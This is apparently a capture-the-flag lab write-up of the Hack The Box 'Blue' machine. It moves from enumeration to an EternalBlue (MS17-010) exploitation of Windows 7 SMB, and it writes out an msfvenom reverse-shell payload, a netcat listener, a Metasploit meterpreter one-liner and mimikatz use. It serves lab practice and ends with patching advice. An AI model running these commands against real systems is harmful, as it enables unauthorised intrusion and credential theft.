### Enumeration
#### rustscan
```bash
rustscan --accessible -a 10.129.179.6 -- -Pn -p-
```
![](/assets/Images-02-Blue/2021-12-29-20-24-16.png)
_rustscan results_

#### nmap
```bash
nmap -T4 -Pn -A -p 135,139,445,49152,49153,49154,49155,49156,49157 10.129.179.6
```
![](/assets/Images-02-Blue/2021-12-29-20-30-32.png)
_nmap results_

```bash
nmap -Pn -A --script=smb-vuln* -p 139,445 10.129.179.6 | tee nmap-vulns.log
```

_nmap vulnerablity scan results_

Target running 
- OS : Windows 7 Professional 7601 Service Pack 1
- SMB Service with disabled message signing.

This can lead to exploitation using eternal blue exploit on outdated OS with vulnerable state of service.

nmap vulnerablity script scan gave confirmation target is vulnerable to 
- CVE-2017-0143 : Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)

#### smbclient
```bash
smbclient -q -NL 10.129.179.6 # Shares List

smbclient -N \\\\10.129.179.6\\Users # readable
```
- `smbclient` gave a list of shares. Only share `Users` is readable. None of them are writeable.
- Admin shares are not accessible.

### Exploitation
#### MS17-010
For exploiting the target using MS17-010 we can use the following exploit from github. [MS17-010](https://github.com/helviojunior/MS17-010)

```bash
git clone https://github.com/helviojunior/MS17-010.git
cd MS17-010/
python checker.py 10.129.179.6
```

> From this repository `checker.py` script uses null authentication to check vulnerability. Directly running it will fail the check in this case. 'guest' authentication is used in nmap / smbclient and shares were accessible.

After changing username on line 14 of `checker.py` it will give named pipes and confirm target is vulnerable to eternalblue.

_checker.py update and check_

Update username on line 37 of `send_and_execute.py` so exploit can work.

This exploit requires malicious executable to get a reverse shell. We will create it using following commands in the same location of exploit.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f exe > eternalblue.exe
```
![](/assets/Images-02-Blue/2021-12-29-22-06-46.png)
_updating send-and-execute.py and msfvenom_

And run the exploit after setting up ncat listener.

```bash
rlwrap nc -lvnp 1337

# python send_and_execute.py TARGET_IP eternalblue.exe
python send_and_execute.py 10.129.179.6 eternalblue.exe
```
**And finally we get a shell with highest privileges.**

_system shell_

---

#### Metasploit | MS17-010

With below one liner we can exploit target with Metasploit MS17-010 module and get meterpreter shell.
```bash
msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; set RHOSTS 10.129.179.6; run;"
```
![](/assets/Images-02-Blue/2021-12-29-23-06-14.png)
_meterpreter shell_

---

### Post Exploitation
This system was compromised with highest privilege.
Transferred and executed `mimikatz`.
No hashes were saved in system.

![](/assets/Images-02-Blue/2021-12-29-22-58-41.png)
_hashdump attempt / mimikatz_

---

### Recommendation

SMB was enabled on outdated un-supported Windows 7 and SMB message signing was disabled. 

> Update to latest supported version of Windows. 
> Advise not to run SMB service with disabled message signing as Administrator.

---

### Key Learning
In this pentest, with easiest enumeration we got to know target is vulnerable to eternal blue. And there are a lot of exploits available for this on github and other resources.

SMB service was using `guest` authentication. 
We modified vulnerability scanner and exploit with `guest` as credentials to work.
